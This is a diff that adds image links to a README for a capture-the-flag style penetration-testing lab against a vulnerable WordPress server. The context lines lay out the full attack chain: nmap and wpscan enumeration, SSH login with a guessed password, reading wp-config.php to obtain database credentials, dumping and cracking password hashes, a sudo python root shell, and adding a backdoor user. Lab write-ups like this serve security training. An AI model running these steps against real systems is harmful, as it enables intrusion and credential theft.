@@ -6,7 +6,7 @@ This lab is an extension of [Red Team vs. Blue Team](https://github.com/keeslonk
 
 There are several steps involved with penetrating a network: Planning and Reconnaissance, Scanning, Exploitation, Post Exploitation, and Reporting. Once the network has been exploited there are a number of ways an attacker can abuse a system including stealing sensitive data, modifying data on the network, compromising the availability of data for a ransom and leaving a backdoor for perpetual access.
 
-![NetworkTopology]()
+![NetworkTopology](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/network_topology.JPG)
 
 This document contains the following details:
 - Description of Topology
@@ -37,7 +37,7 @@ The configuration details of each machine may be found below.
   > - git clone https://github.com/vulnersCom/nmap-vulners.git
   > - nmap --script nmap-vulners/ -sV $target1
   
- ![vulnerabilities]() 
+ ![vulnerabilities](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/Port22_vulns.JPG) 
  
 - A host of vulnerabilities were discovered using the nmap scripted scan, the most obvious being SSH
 
@@ -50,7 +50,7 @@ The configuration details of each machine may be found below.
     > - nmap -sV $target1
    - The scan revealed the following results:
    
- ![nmapResults]()
+ ![nmapResults](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/nmap_scan.JPG)
  
 - The following services and port numbers were identified as potential points of entry:
   - SSH:22
@@ -60,8 +60,12 @@ The configuration details of each machine may be found below.
   - Netbios-ssn:445
   
 - Since we know the machine is a wordpress server, we can use a tool called wpscan to enumerate users on the Wordpress server
+- Here are some useful flags with this tool
+
+![wpscan_attacks](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/wpscan_attacks.JPG)
+
   > - wpscan --url http://192.168.1.110/wordpress --enumerate u
-  ![wpScan]()
+  ![wpScan](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/username_flag1.JPG)
 
 - 2 users were identified on the server: steven and michael
 - We can use this information to try and exploit SSH to get into the system 
@@ -70,26 +74,26 @@ The configuration details of each machine may be found below.
 - F12 brings up the developer options where we can use the "inspector" tab to search using the word flag
 - This reveals flag1
 
-![flag1]()
+![flag1](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/flag1_txt_webpage.JPG)
 
 ### Exploitation
 
 - Before resulting to a program to bruteforce passwords, we can try a few obvious and insecure passwords to SSH into the web server like [michael:michael]
   > - ssh michael@192.168.1.110
   
-![sshMichael]()
+![sshMichael](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/ssh_michael_userShell.JPG)
 
 - The next step is to try the obvious, and used commands to search for the first flag
   > - find / -iname flag*.txt
   
-![Flag2]()
+![Flag2](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/flag2.JPG)
 
 - The first flag was discovered in /var/www/flag2.txt
 - I wanted to download this file for later, so I opened another terminal and used the secure copy tool to download it from the target machine to my machine
   > - scp michael@192.168.1.110:/var/www/flag2.txt ~/Downloads/
   > - note the syntax for scp is user@ip.address:/path_to_download_file path_on_your_machine
 
-![scpFlag2]()
+![scpFlag2](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/download_flag2txt.JPG)
 
 - Now we want to exploit the mysql database to dump the password hashes, so we need to find the database password
 - Sometimes, developers keep default passwords, or worse actual passwords themselves in a configuration file for Wordpress
@@ -97,13 +101,13 @@ The configuration details of each machine may be found below.
   > - cd /var/www/html/wordpress
   > - cat wp-config.php
   
-![wpConfigFile]()
+![wpConfigFile](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/wp-config_php.JPG)
   
 - Here we discover the login credentials for the mySQL database is [root:R@v3nSecurity]  
 - Again, this file can be downloaded to our machine in case we get kicked out the system, so return to 2nd terminal
   > - scp michael@192.168.1.110:/var/www/html/wordpress/wp-config.php ~/Downloads/
 
-![scpWpconfig]()
+![scpWpconfig](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/download_wpconfigphp.JPG)
 
 - These credentials were used to log into the mysql database on the Wordpress server
   > - mysql -h localhost -u root -p wordpress
@@ -111,17 +115,17 @@ The configuration details of each machine may be found below.
  - Once authenticated, we need to get a view of the architecture and how the table is set up
   > - show tables;
 
-![showTables]()
+![showTables](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/showTables.JPG)
 
 - Next, we can inspect the data inside of the users table
   > - describe wp_users;
 
-![usersTable]()
+![usersTable](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/mysql_describeUsers.JPG)
 
 - In the users table, we can see two tables "user_login" and "user_pass". We can inspect those for hashes
   > - select user_login, user_pass from wp_users;
 
-![sqlHashes]()
+![sqlHashes](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/mysql_showHashes.JPG)
 
 - To dump these hashes we use a mysql function "concat_ws" to combine the usernames and passwords separated by ":"
 - This is useful because we will be using a program called john the ripper to crack these hashes and they must be in this format
@@ -129,12 +133,12 @@ The configuration details of each machine may be found below.
 - Check to make sure the contents are correct
   > - cat cat /var/www/html/wp_hashes.txt;
   
-  ![hashdump]()
+  ![hashdump](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/dump_passwordHashes.JPG)
   
 - We want to download this file to our machine as well, just in case we are disconnected, so we return to our 2nd terminal
   > - scp michael@192.168.1.110:/var/www/html/wp_hashes.txt ~/Downloads/
 
-![downloadHash]()
+![downloadHash](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/download_wphashestxt.JPG)
 
 - Now that we have the hash file on the Kali machine, we can use john the ripper to crack the password hashes.
   > - cd /usr/share/wordlists
@@ -149,13 +153,13 @@ The configuration details of each machine may be found below.
 - Research was done online to find a command to escalate privileges
   > - sudo python -c 'import pty;pty.spawn("/bin/bash")' id
   
-![privEsc]()
+![privEsc](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/escalate2RootSteven.JPG)
 
 - We can use the find command to find any flag.txt file on the machine and check it's contents
   > - find / -iname flag*.txt
   > - cat /root/flag4.txt
   
-![flag4.txt]()
+![flag4.txt](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/flag4_txt.JPG)
 
 
 
@@ -164,8 +168,8 @@ The configuration details of each machine may be found below.
 - Further inspection into the users table revealed flags 3 and 4
   > - select * from wp_posts;
   
-![flag3]()
-![flag4]()
+![flag3](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/mysql_flag3.JPG)
+![flag4](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/mysql_flag4.JPG)
 
 ### Post-Exploitation
 
@@ -181,7 +185,7 @@ The configuration details of each machine may be found below.
     - Check root privileges
       > - sudo -lU azadmin
       
- ![createUser]()
+ ![createUser](https://github.com/keeslonkf/Attack_Defense_Analysis_VulnerableNetwork/blob/53af2b1cfe92842a75c4a4fbe853349ef162ce86/ADAVN%20images/maintaingAccess_adduser.JPG)
 
 ### Critical Vulnerabilities Review
 
